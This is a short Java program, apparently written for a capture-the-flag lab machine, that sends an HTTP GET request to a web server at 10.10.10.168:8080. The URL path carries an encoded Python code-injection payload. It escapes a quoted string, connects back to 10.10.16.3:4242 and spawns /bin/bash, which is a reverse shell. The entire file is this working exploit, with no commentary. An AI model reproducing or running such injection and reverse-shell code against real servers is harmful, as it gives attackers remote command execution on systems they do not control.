import java.io.IOException;

import java.net.*;
import java.nio.charset.StandardCharsets;

public class Main {

    public static void main(String[] args) {

      
        try {
            sendGET();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void sendGET() throws IOException {
        String q = "';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.3\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")#";
        q=URLEncoder.encode(q,StandardCharsets.UTF_8.toString());
        q=q.replace("+", "%20");
        q=q.replace("%2F","/");
        String url = "http://10.10.10.168:8080/"+q;
        URL obj = new URL(url);
        URLConnection con =  obj.openConnection();
        System.out.println(con.getInputStream());

    }
}
